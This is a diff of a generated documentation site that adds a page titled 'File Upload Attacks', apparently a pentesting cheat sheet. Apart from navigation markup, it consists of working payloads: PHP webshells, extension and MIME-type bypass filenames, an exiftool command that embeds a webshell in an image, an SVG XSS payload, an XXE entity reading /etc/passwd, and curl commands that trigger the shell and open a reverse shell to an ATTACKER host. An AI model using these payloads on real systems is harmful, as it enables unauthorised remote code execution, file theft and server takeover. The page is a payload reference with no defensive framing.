@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#file-upload-attacks" class="md-skip">
           Skip to content
         </a>
       
@@ -1079,6 +1079,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1095,6 +1113,91 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#webshell-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Webshell Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extension-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extension Bypass Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#magic-bytes-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Magic Bytes Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#svg-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SVG XSS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-file-upload-docxxlsx" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via File Upload (DOCX/XLSX)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#after-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        After Upload
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2841,6 +2944,80 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#webshell-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Webshell Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extension-bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extension Bypass Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#magic-bytes-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Magic Bytes Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#svg-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SVG XSS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xxe-via-file-upload-docxxlsx" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE via File Upload (DOCX/XLSX)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#after-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        After Upload
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2859,7 +3036,69 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="file-upload-attacks">File Upload Attacks<a class="headerlink" href="#file-upload-attacks" title="Permanent link">&para;</a></h1>
+<p>Exploiting insecure file upload functionality to upload malicious files — typically a webshell — for remote code execution.</p>
+<h2 id="webshell-payloads">Webshell Payloads<a class="headerlink" href="#webshell-payloads" title="Permanent link">&para;</a></h2>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">&lt;!-- Minimal PHP webshell --&gt;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="cp">&lt;?php</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="x">&lt;!-- With output formatting --&gt;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span>
+</span></code></pre></div>
+<h2 id="extension-bypass-techniques">Extension Bypass Techniques<a class="headerlink" href="#extension-bypass-techniques" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Double extension
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>shell.php.jpg
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>shell.php.png
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a># Case variation
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>shell.PHP
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>shell.PhP
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a># Null byte (older PHP)
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>shell.php%00.jpg
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a># Special PHP extensions
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>shell.php3
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>shell.php4
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>shell.php5
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>shell.phtml
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>shell.phar
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a># MIME type bypass (change Content-Type in request)
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>Content-Type: image/jpeg
+</span></code></pre></div>
+<h2 id="magic-bytes-bypass">Magic Bytes Bypass<a class="headerlink" href="#magic-bytes-bypass" title="Permanent link">&para;</a></h2>
+<p>Add image magic bytes before PHP code to fool MIME checks:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a># JPEG magic bytes
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>FF D8 FF E0   followed by PHP payload
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a># PNG magic bytes
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>89 50 4E 47
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a># Using exiftool to inject into real image
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>exiftool -Comment=&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; image.jpg -o shell.jpg.php
+</span></code></pre></div>
+<h2 id="svg-xss">SVG XSS<a class="headerlink" href="#svg-xss" title="Permanent link">&para;</a></h2>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="nt">&lt;script&gt;</span>alert(1)<span class="nt">&lt;/script&gt;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<h2 id="xxe-via-file-upload-docxxlsx">XXE via File Upload (DOCX/XLSX)<a class="headerlink" href="#xxe-via-file-upload-docxxlsx" title="Permanent link">&para;</a></h2>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cm">&lt;!-- Embed in docx&#39;s word/document.xml via zip --&gt;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>]&gt;
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</span></code></pre></div>
+<h2 id="after-upload">After Upload<a class="headerlink" href="#after-upload" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Trigger the shell</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>curl<span class="w"> </span><span class="s2">&quot;http://target/uploads/shell.php?cmd=id&quot;</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>curl<span class="w"> </span><span class="s2">&quot;http://target/uploads/shell.php?cmd=cat+/etc/passwd&quot;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Upgrade to reverse shell</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>curl<span class="w"> </span><span class="s2">&quot;http://target/uploads/shell.php?cmd=bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/ATTACKER/4444+0&gt;%261&#39;&quot;</span>
+</span></code></pre></div>
 
 
 
